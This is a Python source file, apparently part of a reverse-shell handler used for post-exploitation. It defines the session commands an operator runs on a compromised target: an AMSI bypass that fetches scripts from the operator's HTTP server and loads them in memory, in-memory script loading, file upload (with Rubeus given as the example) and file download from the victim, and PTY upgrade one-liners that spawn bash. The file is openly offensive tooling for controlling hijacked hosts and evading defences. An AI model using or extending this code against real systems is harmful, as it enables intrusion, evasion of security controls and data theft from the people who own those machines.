import os
import re
import subprocess
from commands.abstract_command import AbstractCommand
from shell_utils.shell_factory import Shells
from utils.minishh_utils import MinishhUtils
from utils.print_utils import Printer
from utils.pwsh_utils import ObfUtil
from utils.term_manager import Term
from config.config import AppConfig
from prompt_toolkit.shortcuts import CompleteStyle
from prompt_toolkit.completion import NestedCompleter, PathCompleter, WordCompleter
from prompt_toolkit import PromptSession
from http_handler.http_server import HttpDeliveringServer, HttpServer
from commands.toolbar import MinishToolbar
from utils.generator.payload_generator import PayloadGenerator

class SessionCommand(AbstractCommand):
    """
    Class handling the command available for a session
    """

    COMMANDS = {
        "amsi_bypass" : {"shell": Shells.Powershell, "help": "Bypass amsi, by using the script in [bold red]config.ini[/bold red]"},
        "binaries"    : {"shell": Shells.All, "help": "Display binaries available on the target"},
        "close"       : {"shell": Shells.All, "help": "Close the connection"},
        "download"    : {"shell": Shells.All, "help": "Download a file",
                                                "usage": "download <[bold blue]file_path[/bold blue]>"},
        "exit"        : {"shell": Shells.All, "help": "Return to the menu"},
        "help"        : {"shell": Shells.All, "help": "Show this help, or help about a current command",
                                                "usage": "help ?<[bold yellow]command[/bold yellow]>"},
        "info"        : {"shell": Shells.All, "help": "Show info about the current session"},
        "load"        : {"shell": Shells.Powershell | Shells.Basic, "help": "Load a script in memory"},
        "reset"       : {"shell": Shells.Pty, "help": "Reset the terminal to [bold yellow]cooked[/bold yellow] mode"},
        "setraw"      : {"shell": Shells.All, "help": "Equivalent to [bold]stty raw -echo[/bold]"},
        "scripts"     : {"shell": Shells.All, "help": "Display available scripts in dedicated folder"},
        "shell"       : {"shell": Shells.All, "help": "Interact with the underlying connection"},
        "upload"      : {"shell": Shells.All, "help": "Upload a file in a writable directory",
                                                "usage": "upload <[bold blue]file_path[/bold blue]> <[bold blue]full_path_destination[/bold blue]>"},
        "upgrade"     : {"shell": Shells.Powershell | Shells.Basic, "help": "Upgrade your session to a [bold]pty[/bold] (if possible)"},
        }

    def __init__(self, session_in_use):
        """
        Init the class by giving it access to:
         - The PayloadGenerator class to generate reverse shell
         - The associated session
         - The full_cli which is the command entered by the user
        """
        self.session_in_use = session_in_use
        self.full_cli = None
        self.generator = PayloadGenerator()
        self.init_session()

    def init_session(self):
        """Init the prompt session with  the needed completer"""
        dictionary_target = {}
        for k, _ in SessionCommand.COMMANDS.items():
            if(k == "upload" or (k == "load" and self.shell_type & SessionCommand.COMMANDS[k]["shell"])):
                dictionary_target[k] = PathCompleter(get_paths=lambda: [AppConfig.get("directory", "Script")])

            elif k == "help":
                dictionary_target[k] = WordCompleter(list(SessionCommand.COMMANDS.keys()))

            elif self.shell_type & SessionCommand.COMMANDS[k]["shell"]:
                dictionary_target[k] = None

        completer = NestedCompleter.from_nested_dict(dictionary_target)
        self.session = PromptSession(completer=completer,
                                     complete_style=CompleteStyle.MULTI_COLUMN,
                                     bottom_toolbar=MinishToolbar.get_toolbar,
                                     refresh_interval=MinishToolbar.refresh_interval)

    @property
    def command_executor(self):
        """
        Wrapper for the attribute command_executor that can execute code
        """
        return self.session_in_use.command_executor

    @property
    def shell_type(self):
        """
        Wrapper for the attribute shell_type that give the current type of shell
        """
        return self.session_in_use.connection.shell_type

    def __create_dir_if_not_exists(self, path):
        if not os.path.exists(path):
            os.makedirs(path)

    def __create_random_route(self):
        """Return the name for a route generated randomly"""
        return ObfUtil.get_random_string(21, ext=".log")

    def __can_run(self, cmd):
        """Check if a command can be run in this shelltype"""
        info = self.COMMANDS.get(cmd)
        if info is not None:
            return self.shell_type & info["shell"]
        return False

    def __get_file(self, filename):
        """Used when uploading a file, get it from current path or from the APP Script path"""
        script_path = AppConfig.get("directory", "Script")
        if os.path.isfile(filename):
            return filename

        script_filename = script_path + "/" + filename
        if os.path.isfile(script_filename):
            return script_filename

        Printer.err(f"File not found [blue]{filename}[/blue]")
        return None

    def handle_input(self, cmd):
        if self.is_shell_command(cmd):
            subprocess.run(cmd[1:], shell = True)

        else:
            method, args = self.parse_command(cmd)

            if(self.__can_run(method) and method is not None):
                self.call(method, *args)

            else:
                self.err(method)

    def print_help_header(self):
        Printer.print("========== [blue]Session [bold]Commands[/blue][/bold] ==========")
        Printer.print("[i]run shell command with: ![yellow]<shell_command>[/yellow][/i]")

    def execute_load(self, *args):
        """Load a script in memory"""
        if len(args) != 1:
            Printer.err("Load requires an argument")
        else:
            script = MinishhUtils.get_file(args[0])
            if script is not None:
                route = self.__create_random_route()
                try:
                    self.session_in_use.download_server.notify_download(route, script)
                    Printer.log(f"Creating route {route} --> {script}")
                    self.command_executor.load(
                        HttpServer.create_download_link(route),
                        shell_type = self.shell_type,
                        available_bin = self.session_in_use.session_assets.binaries
                        )

                except Exception as e:
                    Printer.err(e)

                # finally:
                #     self.session_in_use.download_server.end_download(route)

    def execute_help(self, *args):
        self.print_help_header()
        if(len(args) >= 1):
            usage = SessionCommand._get_help_for_command(args[0])
            if(usage is not None):
                Printer.print(usage)
            else:
                Printer.err("No such function")

        else:
            for cmd, info in SessionCommand.COMMANDS.items():
                if self.shell_type & info["shell"]:
                    Printer.print(f" - [dodger_blue1]{cmd:<12}[/dodger_blue1]\t" + info['help'])
        print()

    def execute_amsi_bypass(self, *args):
        """Create a payload to download amsi scripts and load them in memory"""
        payload = []
        amsi_scripts = MinishhUtils.recover_scripts("amsi_bypass_scripts", "Powershell")
        for script in amsi_scripts:
            script_route = HttpDeliveringServer.get_route_for_script(script)
            payload.append(self.generator.generate_payload("generate -t powershell",
                ip=AppConfig.get("default_ip_address"),
                port=HttpServer.get_download_address()[1],
                route=script_route))

        self.command_executor.exec_all_no_result(payload)
        Printer.log("Run: [i]AmsiUtils[/i] and expect a powershell error")

    def execute_info(self, *args):
        self.session_in_use.show_session_info()

    def execute_binaries(self, *args):
        Printer.log("[bold]Binaries[/bold] availables:")
        for binary in self.session_in_use.session_assets.binaries:
            Printer.pad().log(binary)

    def execute_close(self, *args):
        self.session_in_use.notify_close()

    def execute_shell(self, *args):
        Printer.log("Starting interactive shell with connection")
        self.session_in_use.connection.run()

    def execute_scripts(self, *args):
        script_dir = AppConfig.get("directory", "Script")
        if(os.path.isdir(script_dir)):
            Printer.log("Available [bold]scripts[/bold]:")
            for file in sorted(os.listdir(script_dir)):
                Printer.pad().log(file)
        else:
            Printer.err(f"Directory [red]{script_dir}[/red] is missing")

    def execute_download(self, *args):
        if len(args) != 1:
            Printer.err("Usage: download <file>")
        else:
            file = args[0]
            Printer.log(f"Downloading [dodger_blue1]{file}[/dodger_blue1]")
            download_directory = AppConfig.get("directory", "Download")
            self.__create_dir_if_not_exists(download_directory)
            route = self.__create_random_route()
            HttpDeliveringServer.notify_upload(route, file)
            self.command_executor.download(
                HttpServer.create_download_link(route),
                file,
                self.shell_type,
                self.session_in_use.session_assets.binaries)

    def execute_upgrade(self, *args):
        cmdline = PtyUpgrade.get_tty_cmd(self.session_in_use.session_assets.binaries)
        columns, lines = Term.get_size()

        if cmdline is not None:
            if self.shell_type & Shells.Basic:
                self.command_executor.exec_no_result(cmdline)
                self.command_executor.exec_no_result(f"tty && type stty 2>/dev/null && stty rows {lines} columns {columns}")
                self.command_executor.exec_no_result("\n")
                tty = self.command_executor.exec("tty", timeout=1.0, get_all=True)
                if not(re.match(r".*/dev/.*", tty, re.DOTALL)):
                    Printer.vlog(f"Got answer: {tty}")
                    Printer.err("Could not upgrade terminal to [red]tty...[/red]")

                else:
                    Printer.msg("Shell succesfully upgraded to [bold yellow]tty[/bold yellow]")

                    ### Important by now to run default command before changing shell type
                    # self.session_in_use.run_default_command(self.session_in_use.session_assets.shell_type)
                    self.session_in_use.upgrade()
                    self.init_session()

        elif self.shell_type & Shells.Powershell:
            self.execute_load("Invoke-ConPtyShell.ps1")
            self.command_executor.exec_no_result(f"Invoke-Test -Rows {columns} -Cols {lines}")
        else:
            Printer.err("Cannot upgrade shell to [red]tty...[/red]")

    def execute_upload(self, *args):
        """
        Idea:
        > upload rubeus.exe C:\\Windows\\Temp\\rubeus.exe
        1. The process generate the payload for the shell type
        2. A route is created for this file
        3. Payload is sent to the remote target

        ==> Same for download / load

        route = create_route_for_file(file)
        payload = ClassThatKnowsPayload.get_payload_for('upload', shell_type, route)
        send(payload)
        """
        if len(args) != 2 and len(args) != 1:
            Printer.err("Usage: [yellow]upload[/] <file_to_upload> (<where_to_upload>)")
        else:
            filename = MinishhUtils.get_file(args[0])
            if filename is not None:
                if len(args) == 1:
                    Printer.log(f"Uploading [yellow]{filename}[/] in current directory")
                    where = os.path.basename(filename)
                else:
                    where = args[1]
                route = self.__create_random_route()
                try:
                    self.session_in_use.download_server.notify_download(route, filename)
                    Printer.log(f"Creating route {route} --> {filename}")
                    self.command_executor.upload_http(
                            HttpServer.create_download_link(route),
                            where,
                            self.shell_type,
                            self.session_in_use.session_assets.binaries
                            )

                except Exception as e:
                    Printer.err(e)

                # finally:
                #     self.session_in_use.download_server.end_download(route)

    def execute_setraw(self, *args):
        self.session_in_use.connection.shell_handler.set_tty()
        Printer.log("Terminal set to [yellow]raw[/yellow] mode")
        self.init_session()

    def execute_reset(self, *args):
        self.session_in_use.connection.shell_handler.reset_tty()
        self.session_in_use.downgrade()
        Printer.log("Terminal set to [yellow]cooked[/yellow] mode")
        self.init_session()

class PtyUpgrade:
    
    COMMANDS = {
        "python3" : "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "python"  : "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "script"  : "script /dev/null -qc /bin/bash"
        }

    @staticmethod
    def get_tty_cmd(binaries):
        for b in binaries:
            cmd = PtyUpgrade.COMMANDS.get(b)
            if(cmd is not None):
                return cmd
        return None
